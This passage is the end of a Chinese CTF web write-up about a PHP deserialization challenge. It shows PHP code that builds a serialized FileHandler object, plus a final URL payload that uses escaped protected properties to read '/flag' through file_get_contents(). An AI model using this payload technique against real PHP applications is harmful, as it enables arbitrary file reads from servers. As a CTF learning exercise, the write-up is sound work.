class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ord() 函数返回字符串的首个字符的 ASCII 值。</p><p>file_get_contents() 把整个文件读入一个字符串中。</p></blockquote><p>要利用read()的file_get_contents()读取flag.php，即<code>/flag</code></p><p>所以process()的$op==”2”，然后通过output()输出</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把输出的$b适当修改，得到payload</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:5:&quot;&#x2F;flag&quot;;S:10:&quot;\00*\00content&quot;;s:12:&quot;Hello%20World!&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
